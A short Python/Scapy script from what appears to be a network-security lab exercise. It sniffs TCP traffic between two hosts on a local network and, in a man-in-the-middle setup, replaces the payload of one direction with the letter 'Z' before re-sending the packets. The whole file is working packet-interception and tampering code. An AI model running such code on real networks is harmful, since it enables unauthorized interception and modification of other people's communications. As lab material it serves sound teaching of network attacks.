#!/usr/bin/env python3
from scapy.all import *
IP_A = "192.168.1.1"
MAC_A = "04:bf:6d:f3:ff:ad"

IP_B = "192.168.1.35"
MAC_B = "72:d8:2b:d9:ad:08"

MAC_M = "c4:b3:01:cb:93:99"
def spoof_pkt(pkt):
	if pkt[Ether].src == MAC_M:
		return
	if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
		# Create a new packet based on the captured one.
		# 1) We need to delete the checksum in the IP & TCP headers,
		#    because our modification will make them invalid.
		#    Scapy will recalculate them if these fields are missing.
		# 2) We also delete the original TCP payload.
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)
	#################################################################
	# Construct the new payload based on the old payload.
	# Students need to implement this part.
		if pkt[TCP].payload:
			data = pkt[TCP].payload.load  # The original payload data
			print("Replaced with Z :)")
			newdata = b'Z'   # No change is made in this sample code
			send(newpkt/newdata)
		else:
			send(newpkt)
	################################################################
	elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
     		# Create new packet based on the captured one
   		# Do not make any change
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].chksum)
		send(newpkt)
f = 'tcp and (src host 192.168.1.1 or src host 192.168.1.35)'
pkt = sniff(iface='en0', filter=f, prn=spoof_pkt)
